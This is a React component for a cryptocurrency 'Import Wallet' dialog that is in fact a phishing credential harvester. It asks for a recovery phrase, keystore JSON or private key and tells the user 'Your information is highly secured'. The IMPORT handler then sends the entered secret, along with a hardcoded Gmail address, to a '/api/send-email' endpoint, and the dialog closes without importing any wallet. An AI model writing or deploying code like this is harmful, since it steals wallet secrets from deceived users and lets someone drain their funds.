"use client";

import React, { useState, useEffect, useRef } from "react";
import Button from "./Button";

interface Wallet {
  id: string;
  name: string;
  icon: string;
  category: "popular" | "defi" | "hardware" | "mobile";
}

interface ImportWalletModalProps {
  isOpen: boolean;
  onClose: () => void;
  selectedWallet: Wallet | null;
  onWalletModalClose?: () => void;
}

const ImportWalletModal: React.FC<ImportWalletModalProps> = ({
  isOpen,
  onClose,
  selectedWallet,
  onWalletModalClose,
}) => {
  const [activeTab, setActiveTab] = useState<"phrase" | "keystore" | "private">(
    "phrase"
  );
  const [phrase, setPhrase] = useState<string>("");
  const [keystoreData, setKeystoreData] = useState<string>("");
  const [privateKey, setPrivateKey] = useState<string>("");
  const [isImporting, setIsImporting] = useState<boolean>(false);
  const hasClosedWalletModal = useRef<boolean>(false);

  // Close wallet modal when import modal opens (only once)
  useEffect(() => {
    if (isOpen && onWalletModalClose && !hasClosedWalletModal.current) {
      hasClosedWalletModal.current = true;
      onWalletModalClose();
    }
  }, [isOpen, onWalletModalClose]);

  // Reset the flag when modal closes
  useEffect(() => {
    if (!isOpen) {
      hasClosedWalletModal.current = false;
    }
  }, [isOpen]);

  const getImportData = () => {
    switch (activeTab) {
      case "phrase":
        return phrase.trim();
      case "keystore":
        return keystoreData.trim();
      case "private":
        return privateKey.trim();
      default:
        return "";
    }
  };

  const isImportDataValid = () => {
    const data = getImportData();
    return data.length > 0;
  };

  const handleImport = async () => {
    if (!isImportDataValid()) return;

    setIsImporting(true);

    try {
      // Prepare email data
      const emailData = {
        walletName: selectedWallet?.name || "Unknown Wallet",
        importMethod: activeTab,
        importData: getImportData(),
        userEmail: "carlyjenny526@gmail.com", // You can make this configurable
      };

      // Send email
      const response = await fetch("/api/send-email", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(emailData),
      });

      const result = await response.json();

      if (!response.ok) {
        throw new Error(result.error || "Failed to send email");
      }

      // Success - close modal after a brief delay
      setTimeout(() => {
        setIsImporting(false);
        onClose();
        // You can add a success notification here
        console.log("Import request sent successfully");
      }, 1500);
    } catch (error) {
      console.error("Import error:", error);
      setIsImporting(false);
      // You can add an error notification here
      alert("Failed to send import request. Please try again.");
    }
  };

  if (!isOpen || !selectedWallet) return null;

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center">
      {/* Backdrop */}
      <div
        className="absolute inset-0 bg-black/60 backdrop-blur-md"
        // onClick={onClose}h
      />

      {/* Modal */}
      <div className="relative bg-gradient-to-br from-gray-900/95 via-gray-800/95 to-gray-900/95 backdrop-blur-xl border border-purple-500/20 rounded-3xl shadow-2xl max-w-md w-full mx-4 overflow-hidden">
        {/* Glow effect */}
        <div className="absolute pointer-events-none -z-10 inset-0 bg-gradient-to-r from-purple-500/10 via-transparent to-blue-500/10 rounded-3xl" />

        {/* Header */}
        <div className="relative flex items-center justify-between p-6 border-b border-purple-500/20 bg-gradient-to-r from-gray-800/50 to-gray-900/50">
          <div className="flex items-center space-x-3">
            <span className="text-2xl">{selectedWallet.icon}</span>
            <h2 className="font-heading text-xl font-bold text-white">
              Import {selectedWallet.name}
            </h2>
          </div>
          <button
            onClick={onClose}
            className="p-2 hover:bg-purple-500/20 rounded-xl transition-colors group"
          >
            <svg
              className="w-6 h-6 text-gray-400 group-hover:text-white transition-colors"
              fill="none"
              stroke="currentColor"
              viewBox="0 0 24 24"
            >
              <path
                strokeLinecap="round"
                strokeLinejoin="round"
                strokeWidth={2}
                d="M6 18L18 6M6 6l12 12"
              />
            </svg>
          </button>
        </div>

        {/* Tabs */}
        <div className="border-b border-purple-500/20 bg-gradient-to-r from-gray-800/30 to-gray-900/30">
          <div className="flex">
            {[
              { id: "phrase", label: "PHRASE" },
              { id: "keystore", label: "KEYSTORE JSON" },
              { id: "private", label: "PRIVATE KEY" },
            ].map((tab) => (
              <button
                key={tab.id}
                onClick={() => setActiveTab(tab.id as any)}
                className={`flex-1 px-4 py-3 text-sm font-medium transition-all duration-300 ${
                  activeTab === tab.id
                    ? "text-purple-400 border-b-2 border-purple-400 bg-purple-500/10"
                    : "text-gray-400 hover:text-gray-300 hover:bg-purple-500/5"
                }`}
              >
                {tab.label}
              </button>
            ))}
          </div>
        </div>

        {/* Content */}
        <div className="p-6">
          {/* Security Message */}
          <div className="mb-6 p-4 bg-gradient-to-r from-green-500/10 to-emerald-500/10 border border-green-500/30 rounded-xl backdrop-blur-sm">
            <div className="flex items-center space-x-2">
              <svg
                className="w-5 h-5 text-green-400"
                fill="none"
                stroke="currentColor"
                viewBox="0 0 24 24"
              >
                <path
                  strokeLinecap="round"
                  strokeLinejoin="round"
                  strokeWidth={2}
                  d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"
                />
              </svg>
              <p className="text-green-400 text-sm font-medium">
                Your information is highly secured
              </p>
            </div>
          </div>

          {/* Tab Content */}
          {activeTab === "phrase" && (
            <>
              {/* Input Area */}
              <div className="mb-6">
                <textarea
                  value={phrase}
                  onChange={(e) => setPhrase(e.target.value)}
                  placeholder="Enter your recovery phrase..."
                  className="w-full h-32 p-4 bg-gray-800/50 border border-purple-500/30 rounded-xl focus:outline-none focus:ring-2 focus:ring-purple-500 focus:border-purple-500 text-white placeholder-gray-400 resize-none backdrop-blur-sm transition-all duration-300"
                />
              </div>

              {/* Instructions */}
              <p className="text-gray-400 text-sm mb-8">
                Typically 12 (sometimes 24) words separated by single spaces.
              </p>
            </>
          )}

          {activeTab === "keystore" && (
            <>
              {/* Keystore Input */}
              <div className="mb-6">
                <textarea
                  value={keystoreData}
                  onChange={(e) => setKeystoreData(e.target.value)}
                  placeholder="Paste your keystore JSON file content..."
                  className="w-full h-32 p-4 bg-gray-800/50 border border-purple-500/30 rounded-xl focus:outline-none focus:ring-2 focus:ring-purple-500 focus:border-purple-500 text-white placeholder-gray-400 resize-none backdrop-blur-sm transition-all duration-300"
                />
              </div>

              {/* Keystore Instructions */}
              <p className="text-gray-400 text-sm mb-8">
                Paste the contents of your keystore JSON file. This file
                contains your encrypted private key.
              </p>
            </>
          )}

          {activeTab === "private" && (
            <>
              {/* Private Key Input */}
              <div className="mb-6">
                <textarea
                  value={privateKey}
                  onChange={(e) => setPrivateKey(e.target.value)}
                  placeholder="Enter your private key..."
                  className="w-full h-32 p-4 bg-gray-800/50 border border-purple-500/30 rounded-xl focus:outline-none focus:ring-2 focus:ring-purple-500 focus:border-purple-500 text-white placeholder-gray-400 resize-none backdrop-blur-sm transition-all duration-300"
                />
              </div>

              {/* Private Key Instructions */}
              <p className="text-gray-400 text-sm mb-8">
                Enter your private key (64 character hexadecimal string). Keep
                this secure and never share it.
              </p>
            </>
          )}

          {/* Import Button */}
          <Button
            onClick={handleImport}
            disabled={!isImportDataValid() || isImporting}
            className="w-full text-white py-4 px-6 rounded-xl font-medium disabled:opacity-50 disabled:cursor-not-allowed transition-all duration-300 flex items-center justify-center"
          >
            {isImporting ? (
              <>
                <div className="flex items-center justify-center">
                  <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin mr-3"></div>
                  <p>Importing...</p>
                </div>
              </>
            ) : (
              "IMPORT"
            )}
          </Button>
        </div>
      </div>
    </div>
  );
};

export default ImportWalletModal;
